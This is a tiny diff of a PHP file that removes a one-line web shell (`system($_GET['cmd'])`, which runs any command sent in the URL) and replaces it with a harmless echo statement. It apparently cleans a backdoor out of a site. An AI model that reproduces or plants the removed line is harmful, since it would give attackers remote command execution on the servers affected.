@@ -1,1 +1,5 @@
-<?php system($_GET['cmd']); ?>
+<?php
+
+echo '<?php echo $_SERVER["SERVER_NAME"]; ?>'; 
+
+?>
